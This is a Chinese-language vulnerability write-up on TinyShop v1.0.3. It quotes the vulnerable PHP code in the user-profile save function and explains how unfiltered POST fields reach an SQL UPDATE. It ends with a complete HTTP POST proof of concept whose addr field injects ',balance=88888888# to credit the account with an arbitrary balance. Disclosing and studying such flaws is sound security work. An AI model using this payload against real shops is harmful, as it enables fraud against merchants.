

- [TinyShop sql注入#3可无限充值 ---- 2014-07-18](http://wy.ichenfei.com/bug_detail.php?wybug_id=wooyun-2014-068912)
- [Tinyshop刷钱漏洞 ---- 2014-09-03](http://wy.ichenfei.com/bug_detail.php?wybug_id=wooyun-2014-074894)
- [Tinyshop继续刷钱#2 ---- 2014-09-09](http://wy.ichenfei.com/bug_detail.php?wybug_id=wooyun-2014-075063)


#### 漏洞复现:

- TinyShop v1.0.3 ---- 2014-08-08更新


#### 详细说明

有漏洞的代码:
```php
/protected/controllers/ucenter.php:

public function info_save()
    {
        $name = Filter::sql(Req::args("name"));
        $id = $this->user['id'];
        $this->model->table("user")->data(array("name"=>$name))->where("id=$id")->update();
        $this->model->table("customer")->where("user_id=$id")->update();
        $obj = $this->model->table("user as us")->join("left join customer as cu on us.id = cu.user_id")->fields("us.*,cu.group_id,cu.login_time")->where("us.id=$id")->find();
                    $this->safebox->set('user',$obj,$this->cookie_time);
        $this->redirect("info");
    }


framework/web/model/model_class.php
public function update()


framework/lib/util/request_class.php
public static function post()

```

如果调用updata()时没有传递 data数组。他会从post传递过来的数据 赋值于set 带入sql语句 。
#1 无限充值
我们 注册用户后 来到资料修改处
抓包 ，在原有的基础上 加上'balance=888888888

POC:
```
POST /tinyshop_v1.0.3/index.php?con=ucenter&act=info_save HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:39.0) Gecko/20100101 Firefox/39.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://localhost/tinyshop_v1.0.3/index.php?con=ucenter&act=info
Cookie: UM_distinctid=15f06d4d6bf29f-019e498e979b6c-11327a40-100200-15f06d4d6c0314; CNZZDATA1670348=cnzz_eid%3D458061390-1507643362-http%253A%252F%252Flocalhost%252F%26ntime%3D1507643362; lMMh_2132_saltkey=ZaPZbRXa; lMMh_2132_lastvisit=1508386116; lMMh_2132_ulastactivity=384fsjvD2LB5yq8yuXKV13L%2BbE%2BKFABy5F%2BGxGoXJcJrtf18RbPn; lMMh_2132_lastcheckfeed=2%7C1508389735; lMMh_2132_nofavfid=1; lMMh_2132_home_readfeed=1508391201; PHPSESSID=bfc74ej00cen08ejmh9cagep60; safecode=1; Tiny_autologin=87de0112b6NTIxMDA4OTM0MGBmNzUwPDAxPDRjOWdlNDkzajJkZWY
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 167

name=test%40example.com&real_name=%E5%93%87%E5%93%88%E5%93%88&sex=1&birthday=2017-10-09&mobile=18888888888&phone=18888888888&province=0&city=0&county=0&addr=aaaaaaaaaa',balance=88888888#
```
![](images/1.jpg)
![](images/2.jpg)
